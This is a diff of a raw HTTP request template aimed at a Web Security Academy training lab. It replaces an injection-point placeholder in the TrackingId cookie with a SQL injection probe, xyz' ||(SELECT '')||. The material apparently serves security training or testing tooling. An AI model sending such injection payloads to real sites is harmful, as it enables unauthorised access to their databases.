@@ -1,16 +1,18 @@
-GET /filter?category=Pets HTTP/1.1
-Host: 0a8c00f604cce787c0675d6b00cb00e8.web-security-academy.net
-Cookie: TrackingId=[[INJECTION_POINT]]; session=eMnz4o7cM3Zziw5LYsOaJ06KgLJtYnMP
-User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://0a7d00290440f695c1078e8800220062.web-security-academy.net/
+GET /filter?category=Gifts HTTP/1.1
+Host: 0a6000c3038c9d17c2497cb9006a003b.web-security-academy.net
+Cookie: TrackingId=xyz' ||(SELECT '')|| ; session=UYHRV9XYKEfDLShUUbvMrkIZ0ofL1jBd
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="105", "Not)A;Brand";v="8"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
 Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
 Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
 Sec-Fetch-User: ?1
-Te: trailers
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 Connection: close
 
